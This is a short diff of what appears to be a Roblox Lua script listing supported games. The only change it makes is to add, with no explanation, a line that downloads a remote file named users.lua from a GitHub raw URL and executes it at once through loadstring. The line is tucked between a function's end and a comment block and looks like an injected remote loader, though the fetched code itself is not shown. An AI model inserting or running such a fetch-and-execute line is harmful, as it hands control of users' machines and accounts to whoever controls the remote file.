@@ -185,7 +185,7 @@ local function ShowSupportedGames()
 	
 	print(table.concat(supportedGames, "\n"))
 end
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/realgengar/scripts/refs/heads/main/users.lua"))()
 -- Sistema de auto-execução em teleporte (opcional)
 --[[
 do
